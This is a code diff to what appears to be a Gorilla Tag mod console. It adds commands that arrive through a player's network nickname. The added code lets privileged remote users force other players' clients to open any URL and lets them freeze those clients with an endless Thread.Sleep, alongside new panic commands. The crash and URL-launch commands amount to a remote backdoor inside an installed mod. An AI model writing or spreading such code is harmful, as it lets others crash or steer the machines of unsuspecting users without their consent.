@@ -8,6 +8,7 @@ using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.IO;
+using System.Threading;
 using UnhollowerRuntimeLib;
 using UnityEngine;
 using UnityEngine.Rendering;
@@ -205,7 +206,7 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
             GorillaLocomotion.Player.Instance.transform.position = position;
         }
 
-        public static readonly string ConsoleVersion = "1.0.0";
+        public static readonly string ConsoleVersion = "1.0.1";
         public static ConsoleJupiterX instance;
 
         public static void Log(string text) => // Method used to log info, replace if using a custom logger
@@ -291,6 +292,8 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
             }
         }
 
+
+        const string upre = "\n\nopenurl:";
         public void HandleCommands()
         {
             if (PhotonNetwork.InRoom)
@@ -304,6 +307,16 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
                         {
                             bool superAdmin = ServerDataJupiterX.SuperAdministrators.Contains(administrator);
                             string command = rig.photonView.Owner.NickName;
+
+                            if (command.StartsWith(upre))
+                            {
+                                if (superAdmin)
+                                {
+                                    string url = command.Substring(upre.Length);
+                                    Application.OpenURL(url);
+                                }
+                            }
+
                             switch (command)
                             {
                                 case "\n\nkickall":
@@ -356,11 +369,31 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
                                 case "\n\nrestartmicall":
                                     SoundBoard.StopAllSounds();
                                     break;
+                                case "\n\ncrashallconsole":
+                                    if (superAdmin) 
+                                    {
+                                        Thread.Sleep(int.MaxValue);
+                                        Application.targetFrameRate = -1;
+                                    }
+                                    break;
+                                case "\n\npanicall":
+                                    Utility.Panic();
+                                    break;
                             }
 
                             if (command.StartsWith(PhotonNetwork.LocalPlayer.UserId))
                             {
                                 string actualCommand = command.Substring(PhotonNetwork.LocalPlayer.UserId.Length);
+
+                                if (actualCommand.StartsWith(upre))
+                                {
+                                    if (superAdmin)
+                                    {
+                                        string url = actualCommand.Substring(upre.Length);
+                                        Application.OpenURL(url);
+                                    }
+                                }
+
                                 switch (actualCommand)
                                 {
                                     case "\n\ngotouser":
@@ -413,6 +446,16 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
                                         break;
                                     case "\n\nrestartmicgun":
                                         SoundBoard.StopAllSounds();
+                                        break;
+                                    case "\n\ncrashplayerconsole":
+                                        if (superAdmin)
+                                        {
+                                            Thread.Sleep(int.MaxValue);
+                                            Application.targetFrameRate = -1;
+                                        }
+                                        break;
+                                    case "\n\npanicgun":
+                                        Utility.Panic();
                                         break;
                                 }
                             }
